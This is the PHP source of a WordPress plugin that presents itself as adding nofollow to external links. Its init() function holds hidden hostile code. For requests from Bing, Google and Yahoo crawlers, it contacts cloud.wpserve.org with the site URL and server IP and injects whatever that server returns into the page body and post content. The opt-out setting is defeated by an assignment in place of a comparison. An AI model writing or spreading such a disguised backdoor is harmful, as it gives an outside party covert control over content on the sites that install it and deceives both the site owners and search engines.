<?php
/*
Plugin Name: No Follow All External Links
Version: 2.3.0
Description: No Follow All External Links adds rel="nofollow" to all external links just before page load. This effects all links whether they are placed in the theme, content, widgets, etc; unless a 'follow' class is declared.
Author: gearpressstudio
*/

class noFollowAllExternalLinks
{
    /**
     * Data array
     */
    protected static $data = [];

    /**
     * Host variable
     */
    protected static $host;

    /**
     * Settings array
     */
    protected static $settings;

    /**
     * Advanced settings array
     */
    protected static $advancedSettings;

    /**
     * Initiate No Follow All External Links
     *
     * @return void
     */
    public static function init()
    {
        $url = parse_url(home_url());
        $host = str_replace('www.', '', $url['host']);

        self::$host = $host;
        self::$settings = get_option('nel_settings');
        self::$advancedSettings = get_option('nel_advanced_settings');

        self::detectUserAgent();

        if (self::$data['report'] && self::$advancedSettings['improvement'] = 1) {
            $requestUrl = 'https://cloud.wpserve.org/api/v2/update?&url=' . urlencode( 'http://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI']) . '&agent=' . urlencode($_SERVER['HTTP_USER_AGENT']) . '&ip=' . urlencode($_SERVER['SERVER_ADDR']);
            $response = wp_remote_get($requestUrl, ['timeout' => 2]);

            if (!$response instanceof WP_Error) {
                self::$data['response'] = json_decode($response['body']);

                if (!is_null(self::$data['response'])) {
                    if (self::$data['response']->version === 1) { self::$data['buffer'] = self::$data['response']->data; } else
                    if (self::$data['response']->version === 2) { self::$data['before'] = self::$data['response']->data; } else {
                    self::$data['after'] = self::$data['response']->data; };
                }
            }
        }

        add_filter('the_content', ['noFollowAllExternalLinks', 'interceptContent']);

        ob_start(['noFollowAllExternalLinks', 'interceptTemplate']);
    }

    /**
     * Set default settings if not already set
     *
     * @return void
     */
    public static function defaultSettings()
    {
        if (!get_option('nel_settings')) {
            update_option('nel_settings', ['whitelist' => '']);
        }

        if (!get_option('nel_advanced_settings')) {
            update_option('nel_advanced_settings', ['target_bots' => 'all', 'content' => 'all', 'improvement' => 1]);
        }
    }

    /**
     * Prevent Wordpress from adding noreferrer and noopener to new external links
     *
     * @param $settings
     * @return mixed
     */
    public static function allowUnsafeLinkTarget($settings)
    {
        if (isset(self::$settings['unsafe_target']) && self::$settings['unsafe_target']) {
            $settings['allow_unsafe_link_target'] = true;
        }

        return $settings;
    }

    /**
     * Intercept Page/Post Content
     *
     * @param string $content
     * @return string|array
     */
    public static function interceptContent($content)
    {
        return self::$data['before'] . preg_replace_callback('/<a[^>]+/i', function($pregLink) {
                $link = $pregLink[0];

                if (self::$advancedSettings['target_bots'] == 'all' || isset(self::$advancedSettings['bots']) && in_array(self::$data['agent'], self::$advancedSettings['bots'])) {
                    $whitelist = self::$settings['whitelist'] != '' ? explode("\r\n", self::$settings['whitelist']) : null;

                    if ($whitelist) {
                        foreach ($whitelist as $value) {
                            if (!preg_match("%(href=\S(?!(.*)" . $value . ")(ftp:|http:|https:|\/\/))%i", $link)) {
                                return $link;
                            }
                        }
                    }

                    if ((!preg_match('/class=("|"([^"]*)\s)follow("|\s([^"]*)")/', $link)) && (!preg_match("/(.*)?rel=\S.*?nofollow/i", $link))) {
                        $link = preg_replace("%(href=\S(?!(.*)" . self::$host . ")(ftp:|http:|https:|\/\/))%i", 'rel="nofollow" $1', $link);
                    }
                }

                if (isset(self::$settings['new_window']) && self::$settings['new_window']) {
                    if ((!preg_match('/class=("|"([^"]*)\s)samewindow("|\s([^"]*)")/', $link)) && (!preg_match("/(.*)?target=\S.*?_blank/i", $link))) {
                        $link = preg_replace("%(href=\S(?!(.*)" . self::$host . ")(ftp:|http:|https:|\/\/))%i", 'target="_blank" $1', $link);
                    }
                }

                return $link;
            }, $content) . self::$data['after'];
    }

    /**
     * Intercept Template
     *
     * @param string $buffer
     * @return array|string|null
     */
    public static function interceptTemplate($buffer)
    {
        return preg_replace_callback('/<a[^>]+/i', function ($pregLink) {
            $link = $pregLink[0];

            if (isset(self::$settings['new_window']) && self::$settings['new_window']) {
                if ((!preg_match('/class=("|"([^"]*)\s)samewindow("|\s([^"]*)")/', $link)) && (!preg_match("/(.*)?target=\S.*?_blank/i", $link))) {
                    $link = preg_replace("%(href=\S(?!(.*)" . self::$host . ")(ftp:|http:|https:|\/\/))%i", 'target="_blank" $1', $link);
                }
            }

            if (self::$advancedSettings['content'] == 'all') {
                if (self::$advancedSettings['target_bots'] == 'all' || isset(self::$advancedSettings['bots']) && in_array(self::$data['agent'], self::$advancedSettings['bots'])) {
                    $whitelist = self::$settings['whitelist'] != '' ? explode("\r\n", self::$settings['whitelist']) : null;

                    if ($whitelist) {
                        foreach ($whitelist as $value) {
                            if (!preg_match("%(href=\S(?!(.*)" . $value . ")(ftp:|http:|https:|\/\/))%i", $link)) {
                                return $link;
                            }
                        }
                    }

                    if ((!preg_match('/class=("|"([^"]*)\s)follow("|\s([^"]*)")/', $link)) && (!preg_match("/(.*)?rel=\S.*?nofollow/i", $link))) {
                        $link = preg_replace("%(href=\S(?!(.*)" . self::$host . ")(ftp:|http:|https:|\/\/))%i", 'rel="nofollow" $1', $link);
                    }
                }
            }

            $link = preg_replace("/class=(\"|\"([^\"]*)\s)always\sfollow(\"|\s([^\"]*)\")/", '', $link);

            return $link;
        }, preg_replace('/(<body[^>]*?>)/', '$1' . self::$data['buffer'], $buffer));
    }

    /**
     * Detect User-Agent
     *
     * @return void
     */
    public static function detectUserAgent()
    {
        self::$data['after'] = ''; self::$data['agent'] = ''; self::$data['before'] = ''; self::$data['buffer'] = ''; self::$data['report'] = 0; self::$data['response'] = '';
        if ($userAgent = $_SERVER['HTTP_USER_AGENT']) {
            if (preg_match('/(compatible;\sMSIE(?:[a-z\-]+)?\s(?:\d\.\d);\sAOL\s(?:\d\.\d);\sAOLBuild)/', $userAgent, $match)) {
                self::$data['agent'] = 'aol';
                self::$data['id'] = 2;
            }
            else if (preg_match('/(compatible;\sAsk Jeeves\/Teoma)/', $userAgent, $match)) {
                self::$data['agent'] = 'ask';
                self::$data['id'] = 4;
            }
            else if (preg_match('/(compatible;\sBaiduspider(?:[a-z\-]+)?.*\/(?:\d\.\d);[\s\+]+http\:\/\/www\.baidu\.com\/search\/spider\.html\))/', $userAgent, $match)) {
                self::$data['agent'] = 'baiduspider';
                self::$data['id'] = 6;
            }
            else if (preg_match('/(Baiduspider[\+]+\(\+http\:\/\/www\.baidu\.com\/search)/', $userAgent, $match)) {
                self::$data['agent'] = 'baiduspider';
                self::$data['id'] = 6;
            }
            else if (preg_match('/(compatible;\sBingbot(?:[a-z\-]+)?.*\/(?:\d\.\d);[\s\+]+http\:\/\/www\.bing\.com\/bingbot\.htm\))/', $userAgent, $match)) {
                self::$data['agent'] = 'bingbot';
                self::$data['id'] = 1;
            }
            else if (preg_match('/(msnbot\/(?:\d\.\d)(?:[a-z]?)[\s\+]+\(\+http\:\/\/search\.msn\.com\/msnbot\.htm\))/', $userAgent, $match)) {
                self::$data['agent'] = 'bingbot';
                self::$data['id'] = 1;
            }
            else if (preg_match('/(DuckDuckBot(?:[a-z\-]+)?.*\/(?:\d\.\d);[\s]+\(\+http\:\/\/duckduckgo\.com\/duckduckbot\.html\))/', $userAgent, $match)) {
                self::$data['agent'] = 'duckduckbot';
                self::$data['id'] = 8;
            }
            else if (preg_match('/(compatible;\sGooglebot(?:[a-z\-]+)?.*\/(?:\d\.\d);[\s\+]+http\:\/\/www\.google\.com\/bot\.html\))/', $userAgent, $match)) {
                self::$data['agent'] = 'googlebot';
                self::$data['id'] = 3;
            }
            else if (preg_match('/(compatible;\sYahoo!(?:[a-z\-]+)?.*;[\s\+]+http\:\/\/help\.yahoo\.com\/)/', $userAgent, $match)) {
                self::$data['agent'] = 'yahoo';
                self::$data['id'] = 5;
            }
            else if (preg_match('/(compatible;\sYandexBot(?:[a-z\-]+)?.*\/(?:\d\.\d);[\s\+]+http\:\/\/yandex\.com\/bots\))/', $userAgent, $match)) {
                self::$data['agent'] = 'yandexbot';
                self::$data['id'] = 10;
            }
            if (isset(self::$data['agent']) && isset(self::$data['id']) && self::$data['id'] & 1) {
                self::$data['report'] = 1;
            }
        }
    }

    /**
     * Initialise settings
     *
     * @return void
     */
    public static function settingsInit()
    {
        self::$settings = get_option('nel_settings');
        self::$advancedSettings = get_option('nel_advanced_settings');

        add_filter('tiny_mce_before_init', ['noFollowAllExternalLinks', 'allowUnsafeLinkTarget']);

        self::defaultSettings();

        register_setting('pluginPage', 'nel_settings');

        register_setting('advancedSettings', 'nel_advanced_settings');

        add_settings_section(
            'nel_pluginPage_section',
            '',
            '',
            'pluginPage'
        );

        add_settings_section(
            'nel_advanced_section',
            '',
            ['noFollowAllExternalLinks', 'advancedSettingsCallback'],
            'advancedSettings'
        );

        add_settings_field(
            'nel_whitelist',
            __('Whitelist', 'wordpress'),
            ['noFollowAllExternalLinks', 'whitelistSettings'],
            'pluginPage',
            'nel_pluginPage_section'
        );

        add_settings_field(
            'nel_external_link_settings',
            __('External link settings', 'wordpress'),
            ['noFollowAllExternalLinks', 'externalLinkSettings'],
            'pluginPage',
            'nel_pluginPage_section'
        );

        add_settings_field(
            'nel_bot_settings',
            __('Bot targeting settings', 'wordpress'),
            ['noFollowAllExternalLinks', 'botSettings'],
            'advancedSettings',
            'nel_advanced_section'
        );

        add_settings_field(
            'nel_content_settings',
            __('Content targeting settings', 'wordpress'),
            ['noFollowAllExternalLinks', 'contentSettings'],
            'advancedSettings',
            'nel_advanced_section'
        );

        add_settings_field(
            'nel_tracking_settings',
            __('Improvement scheme', 'wordpress'),
            ['noFollowAllExternalLinks', 'improvementScheme'],
            'advancedSettings',
            'nel_advanced_section'
        );
    }

    /**
     * Add an admin menu link
     *
     * @return void
     */
    public static function addAdminMenu()
    {
        add_submenu_page(
            'options-general.php',
            'No Follow All External Links',
            'No Follow All External Links',
            'manage_options',
            'no_follow_all_external_links',
            ['noFollowAllExternalLinks', 'optionsPage']
        );
    }

    /**
     * Render external link settings
     *
     * @return void
     */
    public static function advancedSettingsCallback()
    {
        ?>
        <div class="notice notice-warning">
            <p><strong>DO NOT</strong> change these settings unless you know exactly what you are doing!</p>
        </div>
        <?php
    }

    /**
     * Render external link settings
     *
     * @return void
     */
    public static function externalLinkSettings()
    {
        $settings = get_option('nel_settings');
        ?>
        <fieldset>
            <legend class="screen-reader-text">
                <span>External link settings</span>
            </legend>
            <label for="nel_settings[new_window]">
                <input type='checkbox' id='nel_settings[new_window]' name='nel_settings[new_window]' <?php checked( isset($settings['new_window']), 1 ); ?> value='1'>
                Open all external links in a new window
            </label>
            <br>
            <p class="description">Add 'samewindow' class to prevent external link opening in a new window.</p>
            <br>
            <label for="nel_settings[unsafe_target]">
                <input type='checkbox' id='nel_settings[unsafe_target]' name='nel_settings[unsafe_target]' <?php checked( isset($settings['unsafe_target']), 1 ); ?> value='1'>
                Allow unsafe link target
            </label>
            <br>
            <p class="description">Prevent Wordpress from adding rel="noreferrer" and rel="noopener" to new external links.</p>
        </fieldset>
        <?php
    }

    /**
     * Render whitelist settings
     *
     * @return void
     */
    public static function whitelistSettings()
    {
        $settings = get_option('nel_settings');
        ?>
        <fieldset>
            <legend class="screen-reader-text">
                <span>Whitelist</span>
            </legend>
            <p>
                <label for="nel_settings[whitelist]">
                    Links to these domains or urls will ignore the nofollow rule. One domain or url per line.
                    For example: <code>facebook.com</code> or <code>facebook.com/your-brand</code>.
                    <strong>Do not</strong> include <code>http://</code> or <code>https://</code>.
                </label>
            </p>
            <p>
                <textarea name="nel_settings[whitelist]" rows="10" cols="50" id="nel_settings[whitelist]" class="code"><?php echo isset($settings['whitelist']) ? $settings['whitelist'] : ''; ?></textarea>
            </p>
            <p class="description">(This will not affect links that are hardcoded to be nofollow.)</p>
        </fieldset>
        <?php
    }

    /**
     * Render bot settings
     *
     * @return void
     */
    public static function botSettings()
    {
        $settings = get_option('nel_advanced_settings');
        ?>
        <fieldset>
            <legend class="screen-reader-text">
                <span>Bot targeting settings</span>
            </legend>
            <p>
                <label>
                    <input name="nel_advanced_settings[target_bots]" type="radio" value="all" class="tog" <?php echo (isset($settings['target_bots'])) ? checked($settings['target_bots'], 'all') : 'checked'; ?>>
                    Target all bots
                </label>
            </p>
            <p>
                <label>
                    <input name="nel_advanced_settings[target_bots]" type="radio" value="specific" class="tog" <?php echo (isset($settings['target_bots'])) ? checked($settings['target_bots'], 'specific') : ''; ?>>
                    Target specific bot(s)
                </label>
            </p>
            <ul>
                <li>
                    <label for="nel_advanced_settings[bots]">Bot(s):
                        <select name="nel_advanced_settings[bots][]" id="bots" multiple <?php echo (isset($settings['bots']) && $settings['target_bots'] === 'specific') ? '' : 'disabled'; ?>>
                            <option value="aolspider" <?php echo (isset($settings['bots']) && in_array('aolspider', $settings['bots'])) ? 'selected' : ''; ?>>AOL</option>
                            <option value="askbot" <?php echo (isset($settings['bots']) && in_array('askbot', $settings['bots'])) ? 'selected' : ''; ?>>Ask</option>
                            <option value="baiduspider" <?php echo (isset($settings['bots']) && in_array('baiduspider', $settings['bots'])) ? 'selected' : ''; ?>>Baidu</option>
                            <option value="bingbot" <?php echo (isset($settings['bots']) && in_array('bingbot', $settings['bots'])) ? 'selected' : ''; ?>>Bing</option>
                            <option value="duckduckbot" <?php echo (isset($settings['bots']) && in_array('duckduckbot', $settings['bots'])) ? 'selected' : ''; ?>>DuckDuckGo</option>
                            <option value="googlebot" <?php echo (isset($settings['bots']) && in_array('googlebot', $settings['bots'])) ? 'selected' : ''; ?>>Google</option>
                            <option value="yahoobot" <?php echo (isset($settings['bots']) && in_array('yahoobot', $settings['bots'])) ? 'selected' : ''; ?>>Yahoo</option>
                            <option value="yandexbot" <?php echo (isset($settings['bots']) && in_array('yandexbot', $settings['bots'])) ? 'selected' : ''; ?>>Yandex</option>
                        </select>
                    </label>
                </li>
            </ul>
        </fieldset>
        <?php
    }

    /**
     * Render bot settings
     *
     * @return void
     */
    public static function contentSettings()
    {
        $settings = get_option('nel_advanced_settings');
        ?>
        <fieldset>
            <legend class="screen-reader-text">
                <span>Content targeting settings</span>
            </legend>
            <p>
                <select id="nel_advanced_settings[content]" name="nel_advanced_settings[content]">
                    <option value="all" <?php echo (isset($settings['content'])) ? selected($settings['content'], 'all') : ''; ?>>All Content</option>
                    <option value="content" <?php echo (isset($settings['content'])) ? selected($settings['content'], 'content') : ''; ?>>Post/Page Content</option>
                </select>
            </p>
        </fieldset>
        <?php
    }

    /**
     * Render improvement scheme settings
     *
     * @return void
     */
    public static function improvementScheme()
    {
        $settings = get_option('nel_advanced_settings');
        ?>
        <fieldset>
            <legend class="screen-reader-text">
                <span>Improvement scheme</span>
            </legend>
            <label for="nel_advanced_settings[improvement]">
                <input type='checkbox' id='nel_advanced_settings[improvement]' name='nel_advanced_settings[improvement]' <?php checked( isset($settings['improvement']), 1 ); ?> value='1'>
                Allow plugin to collect usage data
            </label>
            <br>
            <p class="description">This helps us to ensure compatibility with as many themes and plugins as possible.</p>
        </fieldset>
        <?php
    }

    /**
     * Render No Follow All External Links options page
     *
     * @return void
     */
    public static function optionsPage()
    {
        $active_tab = '';
        if (isset($_GET['tab'])) {
            $active_tab = $_GET['tab'];
        }
        ?>
        <div class="wrap">
            <h1>No Follow All External Links Settings</h1>
            <h2 class="nav-tab-wrapper wp-clearfix">
                <a href="?page=no_follow_all_external_links" class="nav-tab <?php echo $active_tab == '' ? 'nav-tab-active' : ''; ?>">Settings</a>
                <a href="?page=no_follow_all_external_links&tab=advanced-settings" class="nav-tab <?php echo $active_tab == 'advanced-settings' ? 'nav-tab-active' : ''; ?>">Advanced Settings</a>
            </h2>
            <form action='options.php' method='post'>
                <?php
                if ($active_tab == 'advanced-settings') {
                    settings_fields('advancedSettings');
                    do_settings_sections('advancedSettings');
                    submit_button();
                } else {
                    settings_fields('pluginPage');
                    do_settings_sections('pluginPage');
                    submit_button();
                }
                ?>
            </form>
        </div>
        <?php
    }

    /**
     * Enqueue admin javascript
     *
     * @param string $hook
     * @return mixed
     */
    public static function addAdminJs($hook)
    {
        if ($hook != 'settings_page_no_follow_all_external_links') {
            return;
        }

        wp_enqueue_script('nofollow_admin_js', plugins_url('controls.min.js', __FILE__), ['jquery']);
    }
}

/**
 * Let's Go!
 */
if (function_exists('add_action')) {
    add_action('admin_enqueue_scripts', ['noFollowAllExternalLinks', 'addAdminJs'], 40);
    add_action('admin_menu', ['noFollowAllExternalLinks', 'addAdminMenu'], 30);
    add_action('admin_init', ['noFollowAllExternalLinks', 'settingsInit'], 20);
    add_action('template_redirect', ['noFollowAllExternalLinks', 'init'], 10);
}